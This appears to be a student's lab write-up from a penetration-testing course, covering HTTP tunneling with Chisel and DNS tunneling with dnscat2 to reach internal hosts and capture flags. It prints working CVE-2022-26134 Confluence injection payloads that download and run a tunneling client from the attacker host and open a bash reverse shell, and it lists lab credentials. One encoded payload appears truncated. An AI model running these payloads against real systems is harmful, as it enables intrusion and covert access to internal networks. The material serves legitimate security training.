
# HTTP Tunneling


2. Start VM Group 2. Download **/exercises/chisel_exercise_client** from CONFLUENCE01 (**192.168.239.63**). There's a server running on port 8008 on PGDATABASE01 (**10.4.239.215**).
   Set up a port forward using Chisel that allows you to run **chisel_exercise_client** against port 8008 on PGDATABASE01.

- Get file
```bash
wget http://192.168.239.63:8090/exercises/chisel_exercise_client
	--2024-06-25 19:04:17--  http://192.168.239.63:8090/exercises/chisel_exercise_client
	Connecting to 192.168.239.63:8090... connected.
	HTTP request sent, awaiting response... 200 
	Length: 1026416 (1002K)
	Saving to: ‘chisel_exercise_client’
	
	chisel_exercise_client  100%[=============================================================================================>] 1002K 1.42MB/s in 0.7s 
	
	2024-06-25 19:04:18 (1.42 MB/s) - ‘chisel_exercise_client’ saved [1026416/1026416]


chmod +x chisel_exercise_client
```

- Download compatible version of chisel, make executable, serve up
```bash
# Download v1.8.1 (working in ~/exercises/forward_tunnel dir)
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
	...
	chisel_1.8.1_linux_amd64.gz  100%[============================================================================>]   3.33M  --.-KB/s    in 0.1s
	...

# Unzip v1.8.1
gunzip chisel_1.8.1_linux_amd64.gz

# Rename
mv chisel_1.8.1_linux_amd64 chisel

# Make executable
chmod +x chisel

# Server
python3 -m http.server 80
```

- Set up Reverse Port Forward Server on Kali
```bash
chisel server --port 8080 --reverse
	2024/06/24 21:16:49 server: Reverse tunnelling enabled
	2024/06/24 21:16:49 server: Fingerprint eqnhO59Dz8gJ4de6b2Kvvnbv1X/QhAPgs8v4PsyBhck=
	2024/06/24 21:16:49 server: Listening on http://0.0.0.0:8080
```

- Send payload to CONFLUENCE01 to:
	1. Download chisel, Store it in /tmp/, & Make Executable
	2. Initiate a reverse port forward
```bash
# 1.
curl http://192.168.239.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.166/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/

# 2.
curl http://192.168.239.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.g%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.166:8080%20R:socks%20%26%3Ert%28%29%22%29%7D/
```

- Verify via our chisel server
```bash
	2024/06/25 19:08:25 server: session#1: Client version (1.8.1) differs from server version (1.9.1-0kali1)
	2024/06/25 19:08:25 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```
	- NOTE the tun is set to 127.0.0.1:1080

- Set proxychains config file
```bash
sudo vim /etc/proxychains4.conf

	socks5  127.0.0.1 1080
```
	- NOTE we set the same port as the Reverse Proxy seen above


- Run `chisel_exercise_client` via proxychains against PGDATABASE01
```bash
proxychains4 ./chisel_exercise_client -i 10.4.239.215 -p 8008
	[proxychains] config file found: /etc/proxychains4.conf
	[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
	[proxychains] DLL init: proxychains-ng 4.17
	Connecting to 10.4.239.215:8008
	[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.4.239.215:8008  ...  OK
	Flag: "OS{bec052233ff6ca0ebd989fcde4d587ec}"
```



# DNS Tunneling

2. Follow the steps in this section to set up the dnscat2 server on FELINEAUTHORITY, and execute the dnscat2 client on PGDATABASE01. Download the binary from **/exercises/dnscat_exercise_client** on CONFLUENCE01. Set up a port forward with dnscat2 which allows you to run **dnscat_exercise_client** against the server running on port 4646 on HRSHARES.


- CONFLUENCE01 - **192.168.227.63**
- MULTISERVER03 - **192.168.227.64**
- FELINEAUTHORITY - **192.168.227.7** - kali : 7he_C4t_c0ntro11er
- PGDATABASE01 - **10.4.227.215** - database_admin : sqlpass123
- HRSHARES - **172.16.227.217**


- Enable the SSH server on Kali & verify SSH port is open
```bash
sudo systemctl start ssh

udo ss -ntplu
	Netid       State        Recv-Q       Send-Q             Local Address:Port                Peer Address:Port       Process  
	...
	tcp         LISTEN       0            128                      0.0.0.0:22                       0.0.0.0:*           users:(("sshd",pid=2153,fd=3))
	tcp         LISTEN       0            128                         [::]:22                          [::]:*           users:(("sshd",pid=2153,fd=4))
```
	- SSH server is listening on port 22 for all interfaces for IPv4 & IPv6

- Get binary
```bash
wget http://192.168.227.63:8090/exercises/dnscat_exercise_client
	--2024-06-27 18:10:42--  http://192.168.227.63:8090/exercises/dnscat_exercise_client
	Connecting to 192.168.227.63:8090... connected.
	HTTP request sent, awaiting response... 200 
	Length: 1026416 (1002K)
	Saving to: ‘dnscat_exercise_client’
	
	dnscat_exercise_client  100%[==========================================================================================================>]   1002K  1.38MB/s    in 0.7s    
	
	2024-06-27 18:10:43 (1.38 MB/s) - ‘dnscat_exercise_client’ saved [1026416/1026416]

chmod +x dnscat_exercise_client
```

- Compromise CONFLUENCE01 w/ CVE-2022-26134 & construct local remote port forward.
```bash
curl -v http://192.168.227.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.166/5555%200%3E%261%27%29.start%28%29%22%29%7D/

# In revshell
python3 -c 'import pty; pty.spawn("/bin/sh")'

# Set up a local reverse port forward
ssh -N -R 127.0..0.1:9999:10.4.227.215:22 kali@192.168.45.166
```

- In Kali, ssh into PGDATABASE01 and FELINEAUTHORITY
```bash
# Tab 1 (PGDATABASE01)
ssh database_admin@127.0.0.1 -p 9999
	database_admin@127.0.0.1''s password: 
	Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-125-generic x86_64)
	database_admin@pgdatabase01:~$


# Tab 2 (FELINEAUTHORITY)
ssh kali@192.168.227.7
	kali@192.168.227.7''s password: 
	Linux felineauthority 6.1.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.12-1kali2 (2023-02-23) x86_64
	...
	kali@felineauthority:~$
```

- Start **dnscat2** server on FELINEAUTHORITY
```bash
# kali@felineauthority:~$
dnscat2-server feline.corp
	[sudo] password for kali: 
	
	New window created: 0
	...
	Of course, you have to figure out <server> yourself! Clients
	will connect directly on UDP port 53.
```

- Start **dnscat2** client on PGDATABASE01
```bash
# database_admin@pgdatabase01:~/
cd dnscat/

dnscat$ ./dnscat feline.corp
	Creating DNS driver:
	 domain = feline.corp
	 host   = 0.0.0.0
	 port   = 53
	 type   = TXT,CNAME,MX
	 server = 127.0.0.53
	
	Encrypted session established! For added security, please verify the server also displays this string:
	
	Tore Lonely Omen Pianos Push Hobble 
	
	Session established!
```

- Set up **dnscat2** port forward on FELINEAUTHORITY to HRSHARES
```bash
	New window created: 1
	Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
	For added security, please ensure the client displays the same string:
	
>> 	Tore Lonely Omen Pianos Push Hobble

# dnscat2>
windows
	0 :: main [active]
	  crypto-debug :: Debug window for crypto stuff [*]
	  dns1 :: DNS Driver running on 0.0.0.0:53 domains = feline.corp [*]
	  1 :: command (pgdatabase01) [encrypted, NOT verified] [*]


window -i 1
	New window created: 1
	history_size (session) => 1000
	Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
	For added security, please ensure the client displays the same string:
	
>> 	Tore Lonely Omen Pianos Push Hobble
	This is a command session!
	
	That means you can enter a dnscat2 command such as
	'ping'! For a full list of clients, try 'help'.

# command (pgdatabase01) 1>
listen 0.0.0.0:4646 172.16.227.217:4646
	Listening on 127.0.0.1:4646, sending connections to 172.16.227.217:4646
```

- Run binary against FELINEAUTHORITY from attack box
```bash
# Kali
./dnscat_exercise_client -i 192.168.227.7 -p 4646
	Connecting to 192.168.227.7:4646
	Flag: "OS{9ca1a6871ac2ca54f4689e69f7210e5d}"
```


### NOTE

>In the context of interface binding, the address 127.0. 0.1 means that the server only listens to the [loopback](Loopback.md) interface.
>On the other hand, binding our server to the 0.0. 0.0 interface means we want to accept traffic from all of the available interfaces.